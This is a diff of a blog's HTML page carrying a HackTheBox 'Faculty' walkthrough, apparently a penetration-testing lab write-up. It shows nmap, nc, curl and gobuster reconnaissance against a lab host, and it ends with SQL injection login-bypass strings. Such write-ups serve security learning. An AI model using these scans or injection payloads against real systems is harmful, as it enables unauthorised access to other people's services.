@@ -3,117 +3,117 @@
 
 Information GatheringNMAP
 command used: ( scanning for all the ports fast and efficient)
-sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.169 -oG nmap/allPorts
+sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.169 -oG nmap&amp;#x2F;allPorts
 
 command used: ( scanning the ports we got )
 nmap -A -sC -sV -p
 
 -&amp;gt; All ports scan:
 Not shown: 64628 closed tcp ports (reset), 905 filtered tcp ports (no-response)
-Some closed por.."><meta name="generator" content="Hexo 6.3.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Ischyr's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Faculty</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Information-Gathering"><span class="toc-text">Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NMAP"><span class="toc-text">NMAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Services"><span class="toc-text">Services</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#TCP-22-Default-port-for-SSH"><span class="toc-text">TCP 22 ( Default port for SSH )</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#TCP-80-Default-port-for-HTTP"><span class="toc-text">TCP 80 ( Default port for HTTP )</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Information-Gathering-Operating-System"><span class="toc-text">Information Gathering ( Operating System )</span></a></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/HackTheBox"><i class="tag post-item-tag">HackTheBox</i></a><a href="/tags/Medium"><i class="tag post-item-tag">Medium</i></a><a href="/tags/Pentesting"><i class="tag post-item-tag">Pentesting</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Faculty</h1><time class="has-text-grey" datetime="2022-09-27T12:22:04.000Z">2022-09-27</time><article class="mt-2 post-content"><img src="/2022/09/27/faculty/avatar.png" class="">
+Some close.."><script src="//unpkg.com/valine/dist/Valine.min.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Ischyr's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Faculty</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Information-Gathering"><span class="toc-text">Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NMAP"><span class="toc-text">NMAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Services"><span class="toc-text">Services</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#TCP-22-Default-port-for-SSH"><span class="toc-text">TCP 22 ( Default port for SSH )</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#TCP-80-Default-port-for-HTTP"><span class="toc-text">TCP 80 ( Default port for HTTP )</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Information-Gathering-Operating-System"><span class="toc-text">Information Gathering ( Operating System )</span></a></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/HackTheBox"><i class="tag post-item-tag">HackTheBox</i></a><a href="/tags/Medium"><i class="tag post-item-tag">Medium</i></a><a href="/tags/Pentesting"><i class="tag post-item-tag">Pentesting</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Faculty</h1><time class="has-text-grey" datetime="2022-09-27T12:22:04.000Z">2022-09-27</time><article class="mt-2 post-content"><img src="/2022/09/27/faculty/avatar.png" class="">
 
 <h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><ul>
 <li><p>command used: ( scanning for all the ports fast and efficient)</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap -p- <span class="token parameter variable">-sS</span> --min-rate <span class="token number">5000</span> <span class="token parameter variable">--open</span> <span class="token parameter variable">-T5</span> <span class="token parameter variable">-vvv</span> <span class="token parameter variable">-Pn</span> <span class="token number">10.10</span>.11.169 <span class="token parameter variable">-oG</span> nmap/allPorts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.169 -oG nmap&#x2F;allPorts</code></pre>
 </li>
 <li><p>command used: ( scanning the ports we got )</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-A</span> <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-p</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -sC -sV -p</code></pre></li>
 </ul>
 <p>-&gt; All ports scan:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Not shown: <span class="token number">64628</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>, <span class="token number">905</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Not shown: 64628 closed tcp ports (reset), 905 filtered tcp ports (no-response)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
 PORT   STATE SERVICE REASON
-<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     syn-ack ttl <span class="token number">63</span>
-<span class="token number">80</span>/tcp <span class="token function">open</span>  http    syn-ack ttl <span class="token number">63</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+22&#x2F;tcp open  ssh     syn-ack ttl 63
+80&#x2F;tcp open  http    syn-ack ttl 63</code></pre>
 <p>-&gt; All ports scan with flags:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.11.169
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Nmap scan report for 10.10.11.169
 
 PORT   STATE SERVICE VERSION
-<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.2p1 Ubuntu 4ubuntu0.5 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
-<span class="token operator">|</span> ssh-hostkey: 
-<span class="token operator">|</span>   <span class="token number">3072</span> e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
-<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">43</span>:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
-<span class="token operator">|</span>_  <span class="token number">256</span> c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
-<span class="token number">80</span>/tcp <span class="token function">open</span>  http    nginx <span class="token number">1.18</span>.0 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
-<span class="token operator">|</span>_http-title: Did not follow redirect to http://faculty.htb
-<span class="token operator">|</span>_http-server-header: nginx/1.18.0 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
-Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
+|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
+|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
+80&#x2F;tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http:&#x2F;&#x2F;faculty.htb
+|_http-server-header: nginx&#x2F;1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</code></pre>
 <h3 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h3><h6 id="TCP-22-Default-port-for-SSH"><a href="#TCP-22-Default-port-for-SSH" class="headerlink" title="TCP 22 ( Default port for SSH )"></a>TCP 22 ( Default port for SSH )</h6><p>   -&gt; SSH package version - Might be able to find the OS and version.<br>   -&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port&#x2F;service?)<br>    -&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p>
 <p>-&gt; SSH package version:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-vn</span> <span class="token number">10.10</span>.11.169 <span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nc -vn 10.10.11.169 22</code></pre>
 <ul>
-<li>output:<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token function">nc</span> <span class="token parameter variable">-nv</span> <span class="token number">10.10</span>.11.169 <span class="token number">22</span>                                           
-<span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.11.169<span class="token punctuation">]</span> <span class="token number">22</span> <span class="token punctuation">(</span>ssh<span class="token punctuation">)</span> <span class="token function">open</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<li>output:<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ nc -nv 10.10.11.169 22                                           
+(UNKNOWN) [10.10.11.169] 22 (ssh) open</code></pre></li>
 </ul>
 <p>-&gt; SSH key fingerprint:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> root@10.10.11.169<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh root@10.10.11.169</code></pre>
 <ul>
-<li>output:<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token function">ssh</span> root@10.10.11.169
-The authenticity of <span class="token function">host</span> <span class="token string">'10.10.11.169 (10.10.11.169)'</span> can't be established.
-RSA key fingerprint is SHA256:75SZkY5Vi8mgCNwavHQo2t6I3P1O/5SUAthmAWKBQOw.
-Are you sure you want to <span class="token builtin class-name">continue</span> connecting <span class="token punctuation">(</span>yes/no/<span class="token punctuation">[</span>fingerprint<span class="token punctuation">]</span><span class="token punctuation">)</span>? <span class="token function">yes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>output:<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ ssh root@10.10.11.169
+The authenticity of host &#39;10.10.11.169 (10.10.11.169)&#39; can&#39;t be established.
+RSA key fingerprint is SHA256:75SZkY5Vi8mgCNwavHQo2t6I3P1O&#x2F;5SUAthmAWKBQOw.
+Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes</code></pre></li>
 </ul>
 <h6 id="TCP-80-Default-port-for-HTTP"><a href="#TCP-80-Default-port-for-HTTP" class="headerlink" title="TCP 80 ( Default port for HTTP )"></a>TCP 80 ( Default port for HTTP )</h6><p>-&gt; Web Server:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token function">curl</span> <span class="token parameter variable">-i</span> http://10.10.11.169 <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">50</span>                                                                                            
-Server: nginx/1.18.0 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
-Date: Tue, <span class="token number">27</span> Sep <span class="token number">2022</span> <span class="token number">11</span>:14:40 GMT
-Content-Type: text/html
-Content-Length: <span class="token number">154</span>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ curl -i http:&#x2F;&#x2F;10.10.11.169 | head -n 50                                                                                            
+Server: nginx&#x2F;1.18.0 (Ubuntu)
+Date: Tue, 27 Sep 2022 11:14:40 GMT
+Content-Type: text&#x2F;html
+Content-Length: 154
 Connection: keep-alive
-Location: http://faculty.htb
+Location: http:&#x2F;&#x2F;faculty.htb
 
-<span class="token operator">&lt;</span>html<span class="token operator">></span>
-<span class="token operator">&lt;</span>head<span class="token operator">></span><span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token number">302</span> Found<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span>
-<span class="token operator">&lt;</span>body<span class="token operator">></span>
-<span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token number">302</span> Found<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token operator">&lt;</span>/center<span class="token operator">></span>
-<span class="token operator">&lt;</span>hr<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span>nginx/1.18.0 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token operator">&lt;</span>/center<span class="token operator">></span>
-<span class="token operator">&lt;</span>/body<span class="token operator">></span>
-<span class="token operator">&lt;</span>/html<span class="token operator">></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;302 Found&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;302 Found&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;
+&lt;hr&gt;&lt;center&gt;nginx&#x2F;1.18.0 (Ubuntu)&lt;&#x2F;center&gt;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;
+</code></pre>
 
 <p>We can see that it’s redirecting us to <a target="_blank" rel="noopener" href="http://faculty.htb/">http://faculty.htb</a> so let’s add <strong>faculty.htb</strong> to our <strong>&#x2F;etc&#x2F;hosts</strong><br>Now if we try to curl we will get:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token function">curl</span> <span class="token parameter variable">-i</span> http://faculty.htb <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">50</span>
-Server: nginx/1.18.0 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
-Date: Tue, <span class="token number">27</span> Sep <span class="token number">2022</span> <span class="token number">11</span>:15:51 GMT
-Content-Type: text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>UTF-8
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ curl -i http:&#x2F;&#x2F;faculty.htb | head -n 50
+Server: nginx&#x2F;1.18.0 (Ubuntu)
+Date: Tue, 27 Sep 2022 11:15:51 GMT
+Content-Type: text&#x2F;html; charset&#x3D;UTF-8
 Transfer-Encoding: chunked
 Connection: keep-alive
-Set-Cookie: <span class="token assign-left variable">PHPSESSID</span><span class="token operator">=</span>92joh5n3i9h2ce47fqnqti2n8r<span class="token punctuation">;</span> <span class="token assign-left variable">path</span><span class="token operator">=</span>/
-Expires: Thu, <span class="token number">19</span> Nov <span class="token number">1981</span> 08:52:00 GMT
+Set-Cookie: PHPSESSID&#x3D;92joh5n3i9h2ce47fqnqti2n8r; path&#x3D;&#x2F;
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
 Cache-Control: no-store, no-cache, must-revalidate
 Pragma: no-cache
 location: login.php
 
-<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span>
-<span class="token operator">&lt;</span>html <span class="token assign-left variable">lang</span><span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span>
+&lt;!DOCTYPE html&gt;
+&lt;html lang&#x3D;&quot;en&quot;&gt;
 
-<span class="token operator">&lt;</span>head<span class="token operator">></span>
-  <span class="token operator">&lt;</span>meta <span class="token assign-left variable">charset</span><span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">></span>
-  <span class="token operator">&lt;</span>meta <span class="token assign-left variable">content</span><span class="token operator">=</span><span class="token string">"width=device-width, initial-scale=1.0"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"viewport"</span><span class="token operator">></span>
-  <span class="token operator">&lt;</span>title<span class="token operator">></span>School Faculty Scheduling System<span class="token operator">&lt;</span>/title<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&lt;head&gt;
+  &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
+  &lt;meta content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot; name&#x3D;&quot;viewport&quot;&gt;
+  &lt;title&gt;School Faculty Scheduling System&lt;&#x2F;title&gt;</code></pre>
 
 <p>Web Server:</p>
 <img src="/2022/09/27/faculty/20220927141733.png" class="">
 
 <p>-&gt; Directory Listing:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://faculty.htb/ <span class="token parameter variable">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster dir -u http:&#x2F;&#x2F;faculty.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt</code></pre>
 <p>-&gt; output:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://faculty.htb/ <span class="token parameter variable">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ gobuster dir -u http:&#x2F;&#x2F;faculty.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
 Gobuster v3.1.0
-by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
-<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://faculty.htb/
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.1.0
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
-<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
-<span class="token number">2022</span>/09/27 07:17:52 Starting gobuster <span class="token keyword">in</span> directory enumeration mode
-<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
-/admin                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">178</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://faculty.htb/admin/<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+[+] Url:                     http:&#x2F;&#x2F;faculty.htb&#x2F;
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster&#x2F;3.1.0
+[+] Timeout:                 10s
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+2022&#x2F;09&#x2F;27 07:17:52 Starting gobuster in directory enumeration mode
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+&#x2F;admin                (Status: 301) [Size: 178] [--&gt; http:&#x2F;&#x2F;faculty.htb&#x2F;admin&#x2F;]</code></pre>
 
 <p>-&gt; <strong>&#x2F;admin</strong> enumeration:</p>
 <img src="/2022/09/27/faculty/20220927142055.png" class="">
@@ -122,7 +122,7 @@ by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="to
 &#39; OR 1 -- -
 &quot; OR &quot;&quot; &#x3D; &quot;
